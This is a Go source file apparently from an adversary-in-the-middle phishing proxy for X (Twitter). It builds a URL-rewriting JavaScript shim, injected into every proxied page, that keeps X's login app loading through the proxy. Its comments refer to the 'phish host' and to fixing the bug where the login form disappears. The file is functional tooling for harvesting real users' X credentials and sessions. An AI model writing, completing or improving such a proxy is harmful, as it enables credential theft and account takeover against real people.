package main

import (
	_ "embed"
	"encoding/json"
	"strings"
)

// shimTemplate is the client-side URL-rewriting shim served at /_xrp/shim.js
// and injected into every proxied HTML page. It patches fetch/XHR/WebSocket/
// EventSource/DOM URL setters at runtime so that the URLs the X SPA constructs
// dynamically (https://api.x.com/..., https://abs.twimg.com/..., ...) are
// rewritten to same-origin /_xrp/ paths and keep flowing through the proxy.
// Without it the SPA's client-side hydration calls hit the real x.com, the
// server-rendered login form unmounts ~1s after load, and the user is left
// with a blank page — the exact "login form disappears" bug.
//
//go:embed shim.js
var shimTemplate string

// shimConfig is the JSON object the shim reads as its `C` config. It is baked
// in at startup from the configured origins.
type shimConfig struct {
	Prefix string   `json:"prefix"`
	Def    string   `json:"def"`
	Exact  []string `json:"exact"`
	Suffix []string `json:"suffix"`
}

// buildShim renders the shim with the proxy's origins baked into its config.
//
//	exact  — bare origins that map to the bare phish host (x.com, twitter.com)
//	suffix — "."+origin subdomains that map to /_xrp/<host> paths
//	prefix — the path prefix used for subdomain routing ("/_xrp/")
func buildShim(origins []string) string {
	exact := make([]string, 0, len(origins))
	suffix := make([]string, 0, len(origins))
	def := ""
	for _, o := range origins {
		exact = append(exact, o)
		suffix = append(suffix, "."+o)
		if o == "x.com" && def == "" {
			def = o
		}
	}
	if def == "" && len(origins) > 0 {
		def = origins[0]
	}

	cfg := shimConfig{Prefix: "/_xrp/", Def: def, Exact: exact, Suffix: suffix}
	b, err := json.Marshal(cfg)
	if err != nil {
		b = []byte(`{"prefix":"/_xrp/","def":"x.com","exact":["x.com"],"suffix":[".x.com",".twimg.com"]}`)
	}
	return strings.Replace(shimTemplate, "__XRP_CONFIG__", string(b), 1)
}
